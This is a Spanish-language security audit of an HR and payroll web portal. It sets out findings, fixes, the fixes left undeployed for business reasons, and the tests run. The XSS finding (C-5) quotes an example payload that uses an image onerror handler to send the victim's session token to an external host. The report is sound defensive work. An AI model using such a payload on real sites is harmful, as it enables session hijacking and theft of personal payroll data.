# Auditoría de seguridad — Portal RR.HH. Grupo LEITEN

_Fecha: 15/08/2026 · Alcance: backend (130 archivos, ~18.4k líneas), frontend (~20.1k líneas), esquema de base, despliegue (Docker, nginx, Caddy)._

> **Estado: DESPLEGADO el 18/08/2026** sobre el stack Docker (`prh_api`, `prh_web`, `prh_db`).
> Por decisión de negocio quedaron **fuera** tres medidas: **C-2** (blanqueo con clave
> temporal aleatoria), **C-4** (política de contraseñas estricta) y **M-2** (cambios en el
> flujo de 2FA). Las tres están implementadas y probadas; C-2 y C-4 se activan con una
> variable de entorno. Ver «Medidas no desplegadas» al final.

---

## Resumen

El portal ya venía bien construido en lo que suele fallar primero: **todas** las rutas
exigen autenticación (los 76 routers montan `requireAuth`), **todas** las consultas SQL
están parametrizadas —no hay inyección explotable—, el motor de fórmulas es un parser
propio sin `eval()`, los adjuntos tienen lista blanca de formatos y se sirven como binario,
y los controles de "solo mi equipo" para gerentes están bien puestos en licencias,
sanciones, evaluaciones, recibos y adelantos.

Lo que faltaba estaba en otra capa: **el ciclo de vida de la sesión, la fortaleza de las
credenciales y la contención frente a un usuario legítimo que se vuelve hostil o cuya
cuenta es robada.** Un token robado valía 8 horas sin excepción; dar de baja a un empleado
no lo echaba del sistema; el blanqueo de contraseña dejaba la clave igual al DNI; y no
había ningún freno de tasa fuera del login, de modo que una sola credencial válida
permitía aspirar la base entera de datos personales.

Se detectaron **23 hallazgos**. Se desplegaron **20**; tres quedaron fuera por decisión de
negocio (C-2, C-4, M-2) y se detallan al final junto con los 3 riesgos residuales.

**Verificación:** 81 tests automáticos en verde (64 previos + 17 de seguridad), 29 pruebas
de integración en vivo contra la base real, y 15 comprobaciones funcionales sobre el portal
ya desplegado. El frontend compila y construye sin errores.

---

## Hallazgos críticos

### C-1 · Un token robado o caducado seguía siendo válido pase lo que pase

`middleware/auth.js` verificaba la firma del JWT y nada más. El token es autocontenido y
dura 8 h, así que **después de emitirse nada lo podía anular**:

- Dar de baja a un empleado (`activo=false`) o desactivar su usuario (`disabled=true`)
  no cortaba su sesión: el chequeo de `disabled` solo existía en el login.
- Bajarle el rol de `admin` a `employee` no le quitaba los permisos: el rol viajaba
  **dentro del token** y se leía de ahí.
- Cambiar la contraseña no expulsaba a quien tuviera una copia del token.
- No existía `logout` en el servidor: cerrar sesión solo borraba el token del navegador.

En un sistema de nómina esto significa que un empleado despedido conservaba acceso a
sueldos, CBU y legajos durante el resto de su jornada.

**Corregido.** Se agregó `token_version` a `empleados` y `personas`; el token lo lleva
firmado y `requireAuth` lo contrasta contra la base en cada pedido (con caché de 15 s para
no pagar una consulta por request). Cualquier cambio sensible —contraseña, rol,
desactivación, baja, cese, logout— incrementa la versión e **invalida al instante todos los
tokens vivos de esa persona**. El rol efectivo ahora se lee siempre de la base, nunca del
token. Se agregó `POST /api/auth/logout`.

> Verificado en vivo: un token bien firmado pero con `role:'admin'` inyectado en el
> payload recibe 403 en `/api/admin/usuarios`.

### C-2 · El blanqueo de contraseña deja la clave igual al DNI · ⚠ NO DESPLEGADO

`POST /api/admin/usuarios/:id/blanquear` hacía `bcrypt.hash(dni)`. El DNI figura en el
listado de usuarios, en los recibos, en cualquier planilla de RR.HH. y en el propio panel
de administración: **quien supiera de un blanqueo reciente entraba a esa cuenta.**
El `must_change_pwd` que se activaba era puramente cosmético — el token emitido servía
para todo el portal.

**NO desplegado por decisión de negocio.** El blanqueo sigue dejando la clave igual al
DNI, por practicidad operativa de RR.HH. El riesgo original permanece: quien sepa de un
blanqueo reciente puede entrar a esa cuenta con un dato que está a la vista en el portal.

Lo que **sí** se desplegó de este punto, porque no cambia el procedimiento de RR.HH.:

- `requireAuth` **bloquea el portal completo** mientras haya cambio de contraseña
  pendiente (solo `/auth/me`, `/auth/logout`, `/auth/2fa/*` y el propio cambio). Antes el
  aviso era cosmético y el token del blanqueo servía para todo. Esto acota el daño: quien
  entre con el DNI no puede leer nómina ni recibos, solo cambiar la clave.
- El blanqueo **invalida las sesiones abiertas** del usuario.

La generación de clave temporal aleatoria queda implementada y probada; se activa con
`BLANQUEO_ALEATORIO=true` (el panel de administración ya muestra la clave cuando llega).

### C-3 · Sin límite de tasa fuera del login

Solo `/api/auth/login` tenía freno. El resto de la API —listado completo de nómina,
reportes, exportaciones de libro de sueldos, F.931, DDJJ sindicales, asistente de IA—
se podía invocar sin ningún tope. Con una única credencial de empleado válida se podía
recorrer la API en bucle y extraer todo lo accesible en minutos, o tumbar el servicio
encadenando liquidaciones en paralelo.

**Corregido.** Nuevo `middleware/rateLimit.js` con cuatro niveles, contando **por usuario
autenticado** (y por IP cuando no lo hay, para no castigar a toda una oficina detrás del
mismo NAT):

| Ámbito | Límite | Aplicado a |
|---|---|---|
| General | 300/min | toda `/api` |
| Credenciales | 15/15 min por IP | login, cambio de clave, 2FA |
| Pesado | 30/min | reportes, liquidación, producción, SICORE, ARCA, Pro-Soft |
| IA | 40/hora | `/api/ia` (cada llamada cuesta dinero real) |
| Correo | 20/hora | `/api/mail` (evita usar el portal como plataforma de spam) |

### C-4 · Contraseñas de 6 caracteres, sin política · ⚠ NO DESPLEGADO

`change-password` aceptaba cualquier cadena de 6 caracteres. Lo único prohibido era que
fuera **exactamente** igual al DNI. `123456`, `password` o `leiten` pasaban sin problema —
y son lo primero que prueba cualquiera.

**NO desplegado por decisión de negocio.** Sigue vigente la regla anterior: mínimo 6
caracteres y que no sea igual al DNI. `123456`, `abcdef` y `Password123` se aceptan.

La política fuerte quedó implementada y probada en `lib/password.js` (mínimo 10 caracteres,
3 de 4 familias de caracteres, lista de contraseñas comunes —incluidas las «maquilladas»
tipo `Password123`—, rechazo de secuencias y prohibición de contener DNI, CUIL, legajo,
nombre o mail). Se activa con `PWD_POLITICA_ESTRICTA=true`, sin tocar código: las rutas
llaman a `validarPasswordSegunConfig`, que elige la política según el interruptor.

Lo que **sí** se desplegó y reduce el impacto de una contraseña débil: el bloqueo de cuenta
tras 8 intentos fallidos (A-1) y el límite de tasa por IP (C-3). Una clave de 6 caracteres
ya no se puede atacar a fuerza bruta contra el portal.

### C-5 · XSS almacenado en las ventanas de impresión

`certificado.ts`, `Sanciones.tsx`, `DdjjSindical.tsx` y `Ganancias.tsx` arman el documento
con `document.write` interpolando datos **sin escapar**: nombre del empleado, empresa,
CUIT, destinatario del certificado, **descripción de la sanción**, nombre del sindicato,
logo y firma.

Varios de esos campos son texto libre. Una descripción de sanción con
`<img src=x onerror="fetch('https://…?t='+localStorage.prh_token)">` se ejecutaba en la
ventana de impresión de quien la abriera —el propio empleado sancionado, su gerente o
RR.HH.— y como la ventana conserva `window.opener`, **se llevaba el token de sesión de la
víctima**. `reciboPrint.ts` sí escapaba, pero su función `esc` no neutralizaba comillas,
por lo que el valor de la firma dentro de `<img src="…">` podía romper el atributo.

**Corregido.** Nuevo `lib/html.ts` con `esc` (incluye `"` y `'`) y `escUrl` (solo admite
`data:image/*`, `https:` y rutas propias; corta `javascript:`). Aplicado en los cinco
archivos.

---

## Hallazgos altos

### A-1 · Enumeración de usuarios en el login

Tres fugas distintas:

- Si el DNI no existía, **nunca se ejecutaba bcrypt** → la respuesta llegaba en ~1 ms
  contra ~230 ms de un intento real. Un atacante distinguía cuentas válidas por el tiempo.
- Una cuenta desactivada devolvía `403 "Usuario desactivado"` en lugar del error genérico,
  confirmando que ese DNI existe y está en el sistema.
- Sin bloqueo por cuenta: el límite era por IP, así que rotando direcciones se podía
  atacar un DNI concreto indefinidamente.

**Corregido.** Se compara siempre contra un hash señuelo real (coste 12) cuando el DNI no
existe; mensaje único `"DNI o contraseña incorrectos"` para inexistente, clave errónea y
cuenta desactivada; y bloqueo de cuenta a los 8 fallos durante 15 minutos
(`failed_logins` / `locked_until`, configurable).

> Verificado en vivo: 229 ms para un DNI inexistente vs 232 ms para uno real.

### A-2 · Sin registro de accesos

No existía traza de quién entró, cuándo, desde dónde, ni de los intentos fallidos.
Además de impedir detectar un ataque de fuerza bruta o un acceso indebido, es un requisito
de la **Ley 25.326 de Protección de Datos Personales** para un sistema que trata
remuneraciones, datos de salud y afiliación sindical.

**Corregido.** Nueva tabla `login_audit` (DNI, éxito/fallo, motivo, IP, user-agent, fecha;
nunca la contraseña ni el token) y endpoint `GET /api/admin/accesos` con filtros y un
resumen de los últimos 7 días.

### A-3 · CORS abierto a todo internet en producción

`docker-compose.prod.yml` traía `CORS_ORIGIN: ${CORS_ORIGIN:-*}`. Con `*`, cualquier sitio
web podía consultar la API desde el navegador de un usuario del portal.

**Corregido.** `config.js` **rechaza el arranque** en producción con `*` o sin
`CORS_ORIGIN`. El compose ya no tiene valor por defecto (`:?` obliga a definirlo). La lista
de orígenes se valida uno a uno.

### A-4 · Secretos por defecto que arrancaban igual

`docker-compose.yml` fijaba `JWT_SECRET: cambiar-en-produccion` y
`POSTGRES_PASSWORD: portal`, sin `NODE_ENV=production`, de modo que la validación existente
en `config.js` **nunca se disparaba**. El puerto 5432 se publicaba en todas las interfaces
de la máquina con esa clave conocida.

**Corregido.** `config.js` ahora también rechaza contraseñas de Postgres por defecto en la
cadena de conexión y añade el secreto del compose a la lista de débiles. El puerto de
Postgres se publica solo en `127.0.0.1`. `bcryptRounds` sube a 12 como mínimo forzado
(estaba en 10) y la sesión baja de 8 h a 2 h.

> Verificado: los cuatro casos de arranque inseguro fallan y la configuración correcta arranca.

### A-5 · Cabeceras de seguridad ausentes

`helmet()` a secas no fija CSP útil, y **nginx no enviaba ninguna cabecera**: el portal se
podía embeber en un iframe de otro sitio (clickjacking sobre acciones de RR.HH.: aprobar
una licencia, blanquear una clave) y no había CSP que limitara de dónde carga scripts.

**Corregido.** En la API: CSP restrictiva (`default-src 'none'`), `frame-ancestors 'none'`,
HSTS de un año en producción, `Referrer-Policy: no-referrer`, COOP/CORP, y
`Cache-Control: no-store` en todas las respuestas —los datos son personales y no deben
quedar en caché de proxies ni del navegador. En nginx (ambas variantes): CSP para la SPA,
`X-Frame-Options: DENY`, `nosniff`, `Permissions-Policy`, `client_max_body_size`,
`server_tokens off` y bloqueo de archivos ocultos, `.sql`, `.env` y `.bak`.

### A-6 · Respaldos de toda la base en texto plano

El respaldo diario (`pg_dump`) escribía un `.sql` sin cifrar y con permisos por defecto.
Ese archivo contiene **la base entera**: sueldos, DNI, CUIL, CBU, certificados médicos,
sanciones y los hashes de contraseña. Quien accediera al disco, a un volumen mal montado o
a una copia del contenedor se llevaba el padrón completo sin necesidad de credenciales.
Además, la cadena de conexión iba como argumento de línea de comandos, visible con `ps`.

**Corregido.** Con `BACKUP_PASSPHRASE`, el dump se cifra con **AES-256-GCM** (clave
derivada con scrypt) **mientras se escribe** — nunca existe una versión en claro en disco.
Carpeta `0700`, archivos `0600`. La cadena de conexión ya no va por línea de comandos.
`restore.js` descifra a un temporal que borra siempre, incluso si `psql` falla. Sin
passphrase el respaldo se hace igual, pero avisa en el log.

> Verificado: ciclo cifrar → descifrar íntegro, y passphrase incorrecta rechazada por el tag GCM.

---

## Hallazgos medios

### M-1 · Los errores filtraban datos personales
`errorHandler` devolvía `err.detail` de Postgres en las violaciones de unicidad — es decir,
`Key (dni)=(30123456) already exists`. Cualquiera que probara dar de alta un registro
recibía de vuelta el dato ajeno. Además se volcaba el error completo a consola en producción.
**Corregido:** solo se informa el nombre de la restricción; se agregó un identificador corto
(`ref`) para cruzar con el log del servidor sin exponer nada; manejo explícito de JSON
malformado, cuerpo excesivo y errores de clave foránea.

### M-2 · 2FA sin re-autenticación ni protección antirreplay · ⚠ NO DESPLEGADO
Con solo un token robado se puede **desactivar el 2FA de la víctima** o regenerarle el
secreto (`/2fa/setup` y `/2fa/disable` no piden la contraseña). Y un código TOTP
interceptado sirve otra vez durante los ~90 s de su ventana.
**NO desplegado por decisión de negocio** (no tocar el flujo de 2FA). El riesgo permanece.
La columna `totp_last_step` quedó creada en el esquema, así que activar el antirreplay es
volver a pasar el último paso usado a `verificarToken`. Lo único que se aplicó a estos
endpoints es el límite de intentos por IP (C-3).

### M-3 · IDOR en talles de HyS
`GET/PUT /api/hys/talles/:empleadoId` permitía a **cualquier** gerente leer y escribir los
de cualquier empleado de cualquier empresa — a diferencia del histórico de talles, que sí
filtraba por equipo. **Corregido:** misma verificación de equipo en ambos verbos, y el
cuerpo del PUT ahora se copia campo a campo con topes de longitud (antes iba entero a
`data.talles`).

### M-4 · Respuestas de encuesta sin validar la pertenencia
`POST /api/encuestas/:id/responder` insertaba con el `preguntaId` que viniera en el cuerpo,
sin comprobar que perteneciera a esa encuesta: se podían inyectar respuestas en preguntas
de **otra** encuesta y falsear sus resultados. **Corregido:** lista blanca de preguntas de
la encuesta, tope de 500 respuestas y validación numérica.

### M-5 · Acceso a propiedades del prototipo por clave de usuario
`MASIVO_FIELDS[campo]` (actualización masiva de legajos) y `tipos[b.tipo]` (borradores de
IA) usaban índice directo: con `campo="constructor"` devolvían una función del prototipo de
`Object`, que es *truthy*, y el pedido seguía adelante con una definición inventada — en el
caso de la IA, interpolando código fuente dentro del prompt. **Corregido:** `Object.hasOwn`
en ambos. También se valida el rol contra la lista cerrada al dar de alta un empleado.

### M-6 · Llamadas salientes sin timeout
`lib/prosoft.js` y `lib/ia.js` hacían `fetch` sin `AbortController`: un proveedor caído o
lento dejaba la petición colgada indefinidamente. Además, el error de la IA se reenviaba
crudo al cliente y suele repetir el prompt (con datos del legajo).
**Corregido:** timeout de 30 s (Pro-Soft) y 60 s (IA), y el detalle del error del proveedor
queda en el log del servidor, no en la respuesta.

### M-7 · Sin tope de entrada en la IA y en el login
El asistente de IA aceptaba consultas de tamaño arbitrario (costo real por token) y
`/api/auth` admitía cuerpos de hasta 5 MB **sin estar autenticado**.
**Corregido:** 4.000 caracteres en el asistente, 8.000 en instrucciones/contexto/perfil, y
límite de 16 KB para el cuerpo JSON de `/api/auth`.

### M-8 · Contenedor corriendo como root
El `Dockerfile` no definía usuario. **Corregido:** `USER node`, `npm ci` para instalación
reproducible y `NODE_ENV=production`. El `.dockerignore` ahora excluye `backups/`, dumps y
todos los `.env*` (solo se excluía `.env`, así que un `.env.local` o un dump se horneaban
en la imagen).

---

## Medidas NO desplegadas (decisión de negocio, 18/08/2026)

Las tres están escritas, probadas y en el repositorio. Lo que sigue es lo que cuesta
tenerlas apagadas, para que la decisión quede registrada con su precio.

| # | Medida | Cómo activarla | Qué riesgo queda abierto |
|---|---|---|---|
| **C-2** | Blanqueo con clave temporal aleatoria | `BLANQUEO_ALEATORIO=true` | Tras un blanqueo, la clave es el DNI — un dato visible en el listado de usuarios, en los recibos y en cualquier planilla. Quien se entere del blanqueo puede tomar la cuenta antes que su dueño. **Mitigado en parte:** con el cambio obligatorio activo, esa sesión solo puede cambiar la contraseña, no leer datos; pero al cambiarla queda con la cuenta. |
| **C-4** | Política de contraseñas estricta | `PWD_POLITICA_ESTRICTA=true` | Se aceptan `123456`, `abcdef`, `Password123`. **Mitigado en parte:** el bloqueo de cuenta a los 8 fallos y el límite por IP impiden probarlas a fuerza bruta *contra el portal*; no protegen si la clave se filtra por otra vía o la adivina un compañero. |
| **M-2** | 2FA: pedir contraseña para configurar/desactivar, y antirreplay del código | requiere reactivar el código (ver comentarios en `lib/totp.js` y `auth.routes.js`) | Con un token robado se puede desactivar el 2FA de la víctima o regenerarle el secreto. Un código TOTP interceptado sirve otra vez durante ~90 s. |

Las dos primeras son un interruptor: se pueden activar en cualquier momento reiniciando el
backend, sin migración ni cambios de código. Las contraseñas existentes siguen valiendo;
la política nueva solo se aplicaría en el siguiente cambio de cada usuario.

---

## Riesgos residuales (decisión pendiente)

1. **El token vive en `localStorage`.** Es la exposición estructural que queda: cualquier
   XSS futuro puede leerlo. Se mitigó por tres lados —se cerró el XSS conocido, la CSP
   impide cargar scripts externos, y la sesión bajó a 2 h con revocación inmediata— pero la
   solución de fondo es mover el token a una cookie `httpOnly; Secure; SameSite=Strict`.
   Eso requiere protección CSRF y tocar los ~40 llamadores del frontend: es un cambio de
   diseño, no un parche, y lo dejo fuera de esta pasada.

2. **`uncaughtException` mantiene el proceso vivo** (`server.js`). Es deliberado y está
   comentado, pero tras una excepción no atrapada el proceso queda en estado indefinido y
   en un sistema de liquidación eso puede escribir datos inconsistentes. Lo razonable es
   registrar y salir, dejando que Docker reinicie (`restart: unless-stopped` ya está puesto).

3. **2FA es opcional para todos los roles.** Las cuentas `admin` y `rrhh` ven la nómina
   completa; conviene volverlo obligatorio para ellas.

---

## Estado del despliegue (18/08/2026)

Desplegado sobre el stack Docker local: `docker compose up -d --build` en
`portal-rrhh-backend` y en `portal-rrhh-frontend`.

```
prh_api   Up   (imagen reconstruida, proceso como usuario `node`, no root)
prh_web   Up   (nginx con las cabeceras de seguridad)
prh_db    Up   (healthy, puerto 5432 solo en 127.0.0.1)
```

El esquema se aplicó solo al arrancar (349 sentencias, 0 errores): se agregaron
`token_version`, `failed_logins`, `locked_until`, `totp_last_step`, `pwd_changed_at` y la
tabla `login_audit`.

**Dos cosas que aparecieron al desplegar y hubo que corregir:**

1. El `Dockerfile` nuevo fija `NODE_ENV=production` (correcto para la imagen que va al
   servidor), pero el compose de desarrollo usa el secreto de dev y la clave `portal` de
   Postgres. Con esa combinación `config.js` habría rechazado el arranque y el contenedor
   quedaba en reinicio permanente. Se fijó `NODE_ENV: development` explícito en
   `docker-compose.yml`.
2. Las cabeceras de seguridad de nginx **no se estaban aplicando**. En nginx, si un bloque
   `location` declara cualquier `add_header` propio, **descarta todos los heredados del
   nivel `server`** — y el bloque `location = /index.html` tenía el suyo para el
   `Cache-Control`. Se reemplazó por la directiva `expires`, que no interfiere con la
   herencia. Verificado: CSP, `X-Frame-Options`, `nosniff`, `Referrer-Policy`,
   `Permissions-Policy`, COOP/CORP y HSTS ahora salen tanto en el HTML como en los assets.

**Para el servidor de producción** (`docker-compose.prod.yml`), completar en el `.env`:

- `JWT_SECRET` — aleatorio de ≥32 caracteres: `openssl rand -hex 32`
- `CORS_ORIGIN` — origen exacto del portal (ya **no** se admite `*`)
- `POSTGRES_PASSWORD` — distinta de `portal`
- `BACKUP_PASSPHRASE` — **guardarla fuera del servidor**; sin ella los respaldos nuevos no
  se pueden restaurar

Si falta alguna, el backend no arranca — es a propósito.

**Efectos visibles para los usuarios:**

- **Todas las sesiones activas se cerraron** en el arranque: los tokens viejos no llevan
  `tv` y se rechazan. Hay que avisar que vuelvan a entrar.
- La sesión ahora dura 2 h en vez de 8 h.
- Tras un blanqueo, el usuario **no puede usar el portal** hasta cambiar la contraseña
  (antes el aviso era ignorable). La clave del blanqueo sigue siendo el DNI.
- Cambiar la contraseña cierra la sesión y obliga a reingresar.
- El login y el cambio de clave se bloquean 15 minutos tras 8 intentos fallidos.

---

## Verificación

```
npm test                                  # 81 OK, 0 fallidos
node test/seguridad-live.mjs              # 29 OK, 0 fallidos (requiere Postgres)
npx tsc -b && npm run build               # frontend limpio
```

`test/seguridad.test.js` (17 casos, sin base) cubre las dos políticas de contraseña —la
estricta y la simple que está vigente—, TOTP, adjuntos y arranque seguro.
`test/seguridad-live.mjs` (29 casos, contra la base real) cubre cabeceras, no-enumeración
con medición de tiempos, bloqueo de cuenta, revocación de sesión, cambio obligatorio de
contraseña, autorización por rol, forja de tokens y fugas en errores.

Sobre el portal ya desplegado se comprobó además, de punta a punta: cabeceras en el HTML y
en los assets, bloqueo de `.env` y `.sql`, login con clave = DNI, el gate de cambio
obligatorio, que la política simple sigue vigente (acepta `abcdef`, rechaza 5 caracteres y
el DNI), que cambiar la clave revoca el token anterior, que el blanqueo vuelve al DNI sin
devolver clave temporal, que el registro de accesos se puebla, y que `2fa/setup` sigue
funcionando sin pedir contraseña.
